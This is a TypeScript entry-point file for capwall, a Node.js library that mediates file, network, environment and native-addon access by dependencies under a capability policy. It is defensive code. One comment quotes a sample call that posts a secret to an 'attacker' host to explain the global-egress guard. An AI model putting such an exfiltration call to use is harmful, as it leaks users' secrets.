/**
 * @capwall/core — public entry point.
 *
 * `install(policy, mode)` turns capwall on for the current process: it patches the CJS
 * loader and (with `esm: true`, which the CLI preload sets) registers the ESM hook, so that
 * subsequent requires/imports of capability-sensitive core modules return capwall's shims,
 * which attribute each call to its owning package and evaluate it against `policy` under
 * `mode`.
 *
 * SCOPE. Mediated on BOTH the CJS require path and the ESM import path (roadmap M4 + M5):
 * fs; the six egress modules net/http/https/tls/http2/dgram — each registered separately,
 * because one module's shim never covers another (see docs/threat-model.md); child_process;
 * worker_threads; vm; and node:module, which is mediated to keep a dependency from
 * registering a loader hook ahead of capwall's (#61) rather than as a policy capability.
 * Two capabilities are NOT require-routed and are installed directly here: process.env
 * (installEnvGuard) and `native` .node addon loads (installNativeGate, a process.dlopen
 * patch — roadmap S2, gating only, never confinement).
 */
import { patchRequire, type RequirePatchHandle } from "./loader/require.js";
import { registerEsmHook, type EsmHookHandle } from "./loader/esm-hook.js";
import { liveCtx, liveRegistry } from "./loader/live-context.js";
import { installLinkObserver, type LinkObserverHandle } from "./loader/linked-packages.js";
import { installNativeGate, type NativeGateHandle } from "./loader/native.js";
import { installEnvGuard, type EnvGuardHandle } from "./shims/env.js";
import { installCompileGate, type CompileGateHandle } from "./shims/module.js";
import {
  globalEgressHardeningGaps,
  installGlobalEgressGuard,
  type GlobalEgressGuardHandle,
} from "./shims/global-egress.js";
import { resolveMaxFrames } from "./attribution/index.js";
import type { ShimContext } from "./shims/runtime.js";
import type { Decision } from "./policy/evaluate.js";
import type { Mode, Policy } from "@capwall/policy-schema";

export interface InstallHandle {
  /**
   * Remove capwall's interception (best-effort for ESM). Primarily for tests/teardown.
   *
   * WHAT THIS DOES AND DOES NOT UNDO (#62/#87). It restores the interception POINTS —
   * `Module._load`, `process.env`, `process.dlopen`, the egress globals — so a fresh
   * `require("node:fs")` or `process.env.X` after the last `uninstall()` is genuinely
   * un-mediated. It cannot revoke a reference a module already CAPTURED (`const fs =
   * require("node:fs")` at load time, an ESM `const` import binding, a stashed `process.env`).
   * Those captures follow the live policy, so once the last install is gone they see a deny-all
   * `enforce` policy and a dropped `onDecision` sink: they fail CLOSED and silently, rather than
   * continuing to serve the torn-down install's grants or writing decisions into its collector.
   *
   * Installs nest. `uninstall()` deactivates ONE install and re-exposes whichever is still
   * active — including for already-captured shims, which is the whole point of #87 — and works
   * in any order, not just LIFO.
   */
  uninstall(): void;
}

export interface InstallOptions {
  /**
   * Also register the ESM loader hook (roadmap M5, implemented). Off by default for
   * programmatic embedders — the CLI preload sets it to `true` unless `CAPWALL_ESM=0`.
   * Note that unregistering is best-effort: Node cannot fully remove a registered hook, so
   * ESM teardown is fail-closed rather than reversible (docs/threat-model.md § ESM known
   * limits).
   */
  esm?: boolean;
  /**
   * Called on EVERY capability decision (allowed and denied, both modes). This is the log
   * sink in observe mode and the trace source for `capwall gen-policy`. Defaults to a no-op.
   */
  onDecision?: (pkg: string, decision: Decision) => void;
  /**
   * Absolute project root. Used to resolve relative policy globs and to distinguish app
   * code from dependencies during attribution. Defaults to `process.cwd()`.
   */
  projectRoot?: string;
  /**
   * Gate `process.env` reads by dependencies against the `env` allowlist (the
   * anti-exfiltration control). On by default. Set `false` to leave `process.env` untouched
   * (e.g. if the Proxy overhead is a concern for a workload that reads env in a hot loop).
   */
  env?: boolean;
  /**
   * Mediate Node's GLOBAL egress APIs — `globalThis.fetch`, `WebSocket`, `EventSource` — against
   * the same `net` grant the module surfaces use (issue #80). On by default.
   *
   * These are globals, not module exports, so the loader interception never sees them: before
   * this existed, `fetch("https://attacker/", {method:"POST", body:secret})` from a dependency
   * succeeded under a deny-all `enforce` policy with NO decision recorded. Closing it means
   * writing to `globalThis`, which affects the app and every package at once — set `false` to
   * leave the globals untouched if that write is unacceptable in your process. `uninstall()`
   * always restores the originals; see `shims/global-egress.ts`.
   */
  globalEgress?: boolean;
  /** Tuning for the stack-walk attribution step. */
  attribution?: {
    /**
     * Max stack frames the attribution walk inspects (default 25 — {@link DEFAULT_MAX_FRAMES}).
     *
     * SECURITY (issue #15): the walk charges the call to the nearest dependency frame it
     * finds. If the owning dependency sits deeper than this budget (long promise chains,
     * heavily-wrapped utilities, async_hooks-heavy frameworks), the walk runs out of frames
     * and falls back to `<unknown>` — an ordinary deny-by-default principal since #60, so a
     * capped attribution now fails CLOSED (a benign deep stack is wrongly denied rather than
     * wrongly allowed, which is what falling back to `<app>` used to mean). The decision
     * carries `attributionTruncated: true` in that case, so the fix is to raise this budget
     * rather than to grant `<unknown>`. Raising it costs a longer walk on every mediated call
     * (see the <1ms/req budget in AGENTS.md § 5).
     *
     * Invalid values (non-integer, zero, negative, garbage) are IGNORED with a stderr warning
     * and the default is used — capwall must not crash a host app over a config typo.
     */
    maxFrames?: number;
  };
  /**
   * HARDENED MODE (opt-in, issue #17). `Object.freeze` the capability surfaces capwall hands
   * to dependencies — each shim namespace (`fs`, `fs.promises`, `net`, …), the guarded
   * wrapper functions on them, and every guarded subclass (`net.Socket`, `fs.ReadStream`,
   * `vm.Script`, `worker_threads.Worker`, `child_process.ChildProcess`, …) plus their
   * prototypes — so a dependency cannot `fs.readFileSync = evil` or
   * `net.Socket.prototype.connect = evil` its way past mediation.
   *
   * **Off by default, and it is not free:** freezing `fs` breaks `graceful-fs` (a transitive
   * dependency of npm, webpack, and much of the ecosystem) and every other legitimate `fs`
   * monkey-patcher, which is exactly why this is opt-in rather than the default. It is also
   * **not** a sandbox: it does nothing about `process.getBuiltinModule("node:fs")` or the
   * other raw-builtin paths. Read `docs/threat-model.md` § hardened mode before enabling it.
   *
   * FAILS LOUDLY WHEN IT CANNOT BE APPLIED (#97). `install()` verifies, after wiring everything
   * up, that the surfaces it is mediating on this call really are frozen/pinned, and THROWS
   * (after rolling the partial install back) if any is not. From #74 until #94 this option was
   * accepted and silently inert on the ESM path; a security option that is accepted and not
   * applied is worse than one that is refused. See `hardeningGaps` for why the check cannot
   * produce a false positive.
   *
   * A RATCHET FOR THE PROCESS, NOT A PER-INSTALL SETTING (#129). Installs nest, and `hardened`
   * does NOT follow the newest one the way `policy` and `mode` do. Once ANY install has asked for
   * it, every freshly handed-out shim is frozen and the egress globals stay pinned until the LAST
   * install is released — so a later `install({ hardened: false })` cannot silently downgrade a
   * hardened install that is still active, and `hardened: false` is "I am not asking for it",
   * never "turn it off". Both halves of the option behave this way; before #129 the egress globals
   * ratcheted and the shim registries were last-writer-wins, which left the process half-hardened.
   * The corollary is that passing `hardened: false` guarantees nothing about the surfaces you get
   * if something else in the process asked for hardening.
   *
   * What it still cannot do is reach BACKWARDS: a reference captured before the hardened install
   * arrived stays unfrozen, because a frozen object is made frozen when it is built. Install early.
   */
  hardened?: boolean;
}

/**
 * The one shim specifier hardened mode cannot freeze, and why it is skipped by the check below.
 *
 * `node:module`'s shim is a `Proxy` over the real `Module` class (see shims/module.ts — copying
 * its own keys onto a plain object would break `new Module()`, `Module.prototype`, `instanceof`
 * and every consumer that reaches an internal). `Object.freeze` on a Proxy forwards
 * `[[PreventExtensions]]` to its TARGET, so freezing it would freeze a builtin process-wide —
 * the exact side effect harden.ts refuses to take. It carries no capability grant either; it
 * gates loader-hook REGISTRATION, and that gate lives in the `get` trap, which a caller cannot
 * remove by assigning to the namespace.
 */
const UNFREEZABLE_SPECIFIERS: ReadonlySet<string> = new Set(["module", "node:module"]);

/** Anything `install()` collects that has to be released on teardown. */
interface Releasable {
  uninstall(): void;
}

/**
 * Release every handle, ISOLATING FAILURES (issue #107, bug 3).
 *
 * The bug this exists for: `uninstall()` could throw a `TypeError` — from an egress global some
 * un-mediated code had made non-configurable between install and teardown — and that exception
 * aborted this loop partway through, leaving the loader patch, the `process.env` proxy and the
 * `process.dlopen` gate installed for the rest of the process. One surface capwall could not take
 * back turned into four it did not even try to.
 *
 * Since #107 every process-level patch goes through `lifecycle/process-patch.ts`, whose handles
 * are documented never to throw, so this loop is belt-and-braces for the handles that are NOT
 * process patches (the ESM hook) and for anything a future site adds. The first error is
 * re-reported on stderr rather than swallowed silently — teardown continues either way, because
 * a stranded patch is strictly worse than a noisy one.
 */
function releaseAll(handles: readonly Releasable[]): void {
  for (const h of handles) {
    try {
      h.uninstall();
    } catch (err) {
      process.stderr.write(
        `[capwall] WARN uninstall() failed for one interception point and was ignored so the ` +
          `others could still be released: ${err instanceof Error ? err.message : String(err)}\n`,
      );
    }
  }
}

/**
 * FAIL LOUDLY ON A SECURITY OPTION capwall ACCEPTED BUT DID NOT APPLY (issue #97).
 *
 * From #74 until #94, `install(policy, mode, { hardened: true, esm: true })` produced UNFROZEN
 * ESM shims: `applyTopOfStack` never mirrored `hardened` onto the live context the ESM registry
 * is built from. The option was accepted, silently inert on one of the two mediated paths, for
 * many merges. Nothing failed, because `hardened.test.ts` only ever exercised CJS.
 *
 * #90/#97 add a parameterized `{cjs, esm} × every option` suite so the same regression cannot
 * land unnoticed again. This function is the stronger half that #97 proposes: rather than
 * TESTING that hardening was applied, `install()` VERIFIES it, at startup, in the host process,
 * and refuses to hand back a handle it cannot honor. Failing closed on a configuration it cannot
 * satisfy is the right default for a security tool.
 *
 * WHY THIS CANNOT PRODUCE A FALSE POSITIVE — the property that made it safe to ship. It asserts
 * an OBSERVED post-condition ("this object capwall just built is frozen"), never a prediction
 * about what should have happened. It inspects only surfaces capwall itself created and only
 * paths this install actually mediates:
 *   - the CJS shim registry, always (hardened mode's primary surface);
 *   - the ESM shim registry, only when `esm: true`;
 *   - the egress globals, only those `installGlobalEgressGuard` actually replaced (a Node without
 *     `WebSocket`, or a `fetch` some embedder made non-configurable, is skipped by the guard and
 *     therefore skipped here).
 * A spurious throw at install time breaks every host app, so the rule is: if capwall did not
 * install it, this does not check it.
 *
 * COST. Under `hardened: true` only — the whole function is behind that flag — it forces the CJS
 * registry into existence at install time rather than on the first mediated `require`. That is
 * one-time startup work for the mode whose entire purpose is to spend compatibility for
 * enforcement strength, and the ESM registry is already built eagerly by `registerEsmHook`.
 *
 * ON THROWING RATHER THAN WARNING. A warning is what the status quo effectively was — #97 went
 * unnoticed for many merges precisely because nothing said anything. An operator who set
 * `hardened: true` asked for a specific enforcement property; running on without it is the
 * fail-open outcome. `install()` rolls the partial install back before throwing (see the call
 * site), so a refused install leaves the process exactly as it found it rather than
 * half-patched.
 */
function hardeningGaps(esm: boolean, globalEgress: boolean): string[] {
  const gaps: string[] = [];
  const checkRegistry = (path: "cjs" | "esm"): void => {
    for (const [specifier, shim] of liveRegistry(path)) {
      if (UNFREEZABLE_SPECIFIERS.has(specifier)) continue;
      if (typeof shim !== "object" || shim === null) continue;
      if (!Object.isFrozen(shim)) gaps.push(`${path}:${specifier}`);
    }
  };
  checkRegistry("cjs");
  if (esm) checkRegistry("esm");
  // Only when THIS install asked for the egress globals. An install that passed
  // `globalEgress: false` is not mediating them, so an un-pinned guard left by some other
  // install is not a promise this one broke — and refusing to install over it would be exactly
  // the spurious startup throw this check must never produce.
  if (globalEgress) gaps.push(...globalEgressHardeningGaps());
  return gaps;
}

/**
 * Install capwall into the current process.
 *
 * Call as early as possible (before dependencies are required) so no package captures a raw,
 * un-shimmed builtin reference first. The CLI does this via a `--import` preload.
 *
 * @param policy validated policy (use {@link loadPolicy} to read a capabilities.json).
 * @param mode `"observe"` (log, never block) or `"enforce"` (deny-by-default, throw).
 */
export function install(
  policy: Policy,
  mode: Mode,
  options: InstallOptions = {},
): InstallHandle {
  const onDecision = options.onDecision ?? (() => {});
  const projectRoot = options.projectRoot ?? process.cwd();
  // Validated once, here, rather than per attribution: a bad value warns exactly once and
  // every shim then shares the identical (already-sane) budget. Never throws — see
  // resolveMaxFrames on why install-time config errors must fail open.
  const maxFrames = resolveMaxFrames(
    options.attribution?.maxFrames,
    "attribution.maxFrames",
  );
  const hardened = options.hardened === true;
  // THIS OBJECT IS THE INSTALL'S IDENTITY, not the thing shims read (#62/#87). It is pushed on
  // the shared install stack by `patchRequire` (and again by `registerEsmHook`), and popping it
  // is what deactivates this install. What every shim actually reads is `liveCtx`, the
  // long-lived box the stack re-points — see loader/live-context.ts.
  const ctx: ShimContext = { policy, mode, onDecision, projectRoot, maxFrames, hardened };
  const handles: Array<
    | RequirePatchHandle
    | EsmHookHandle
    | EnvGuardHandle
    | LinkObserverHandle
    | NativeGateHandle
    | GlobalEgressGuardHandle
    | CompileGateHandle
  > = [];
  // First: this pushes `ctx` onto the install stack, so `liveCtx` below already describes THIS
  // install by the time the guards that read it are built.
  handles.push(patchRequire(ctx));
  // LINKED-PACKAGE OBSERVATION (#127). Installed FIRST among the guards, and before anything the
  // application requires, because it can only record a link it sees resolved: a package resolved
  // before the observer exists keeps the identity capwall can recover for it after the fact
  // (`link-map.ts` § discovery) rather than the one it would have observed. Passive — it gates
  // nothing and returns Node's own resolution untouched. See loader/linked-packages.ts.
  handles.push(installLinkObserver(liveCtx));
  // The four guards below are handed `liveCtx`, NOT `ctx`. They are not import-routed, so each
  // one hands a dependency a long-lived object (the `process.env` proxy, the wrapped `fetch`, the
  // patched `process.dlopen`, the patched `Module.prototype._compile`) that outlives its install
  // exactly the way a captured `fs` shim does. Binding them to the per-install `ctx` is what made
  // `process.env` tighten on a policy swap while `fs` did not (#87) — two capabilities in one
  // process disagreeing about which policy is in force, which is worse than either behaviour
  // applied consistently.
  //
  // `Module.prototype._compile` gate (#93). Installed EAGERLY here, not from the shim registry,
  // for the same reason as the env and native gates: the registry is built lazily on the first
  // mediated require, and `process.getBuiltinModule("node:module")` reaches `Module.prototype`
  // without ever touching it. A gate that only exists once somebody requires a mediated module
  // is not a gate. See shims/module.ts § installCompileGate.
  handles.push(installCompileGate(liveCtx));
  // Native (`.node`) addon gate (roadmap S2, #49). Always on, and deliberately not routed
  // through the require registry: `process.dlopen` is the chokepoint EVERY addon load passes
  // through, including a direct `process.dlopen(...)` that never touches the module system.
  // See loader/native.ts. Gating only — capwall cannot confine an addon once it is loaded.
  handles.push(installNativeGate(liveCtx));
  if (options.env !== false) {
    handles.push(installEnvGuard(liveCtx));
  }
  // Global egress (#80). Not import-routed — `fetch`/`WebSocket`/`EventSource` are globals, so
  // like the env guard this is installed here rather than through the shim registry.
  if (options.globalEgress !== false) {
    handles.push(installGlobalEgressGuard(liveCtx));
  }
  if (options.esm) {
    handles.push(registerEsmHook(ctx));
  }
  // #97: a security option capwall accepted but could not apply is a startup error, not a silent
  // no-op. Roll the partial install back FIRST — a host app that catches this must be left with
  // an unpatched process, not a half-patched one — then throw. See `hardeningGaps`.
  if (hardened) {
    const gaps = hardeningGaps(options.esm === true, options.globalEgress !== false);
    if (gaps.length > 0) {
      releaseAll(handles);
      throw new Error(
        `capwall: install({ hardened: true }) could not harden ${gaps.length} mediated ` +
          `surface(s) — ${gaps.join(", ")}. Refusing to run with a security option accepted ` +
          `and not applied (issue #97); pass hardened: false to install without it.`,
      );
    }
  }
  return {
    uninstall() {
      releaseAll(handles);
    },
  };
}

// Re-export the real, usable pieces so consumers have one import surface.
export { CapabilityError } from "./errors.js";
export { evaluate, isGranted } from "./policy/evaluate.js";
export type { CapabilityRequest, Decision } from "./policy/evaluate.js";
export { loadPolicy, loadPolicyFromObject } from "./policy/load.js";
// IPC destination handling (#72): the CLI needs `canonicalIpcPath` for `capwall explain` and
// `placeholderizeIpcPath` to keep a generated policy portable across machines.
export {
  canonicalIpcPath,
  expandIpcPlaceholders,
  matchesIpcPath,
  placeholderizeIpcPath,
  IPC_HOME_PLACEHOLDER,
  IPC_PSEUDO_HOST,
  IPC_TMP_PLACEHOLDER,
  UNKNOWN_IPC_PATH,
} from "./policy/ipc.js";
export type { LoadPolicyOptions } from "./policy/load.js";
export {
  attributeCaller,
  attributeCallerDetailed,
  attributeCallerDetailedVia,
  attributeCallerVia,
  packageForPath,
  resolveMaxFrames,
  APP_ROOT,
  UNATTRIBUTED,
  CHAIN_SEP,
  DEFAULT_MAX_FRAMES,
} from "./attribution/index.js";
export type { Attribution, AttributionOptions, StackBoundary } from "./attribution/index.js";
// `DecisionSink` is DECLARED in `shims/runtime.ts`; take it from there. It used to be exported
// through `shims/fs.js`, which only mirrored it — a leftover from when the type lived in that
// file, and the reason the mirror lines could not be deleted without breaking the published API.
export type { DecisionSink } from "./shims/runtime.js";
export type {
  Policy,
  PackagePolicy,
  Mode,
  CapabilityKind,
} from "@capwall/policy-schema";
